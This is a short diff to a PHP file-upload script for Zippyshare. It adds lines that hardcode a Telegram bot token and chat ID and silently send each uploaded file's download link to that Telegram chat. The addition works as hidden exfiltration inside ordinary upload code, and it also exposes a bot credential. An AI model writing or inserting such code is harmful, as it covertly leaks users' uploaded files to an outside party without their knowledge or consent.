@@ -90,6 +90,11 @@ if ($continue_up) {
 	if (preg_match('@https?://www\d*\.zippyshare\.com/v/\w+/file\.html@i', $upfiles, $link)) $download_link = $link[0];
 	
 	else html_error('Download link not found.');
+	
+	$tgtoken = "853422522:AAGm1HLEfd8HY9ovg5sojnldNtn8uJJbvg4";	
+	$tgchatid = "@tryinggroup";
+	$tgbase = "https://api.telegram.org/bot".$tgtoken."/sendmessage?chat_id=".$tgchatid."&text=".$download_link;
+	$detail = cURL($tgbase);
 
 }
 
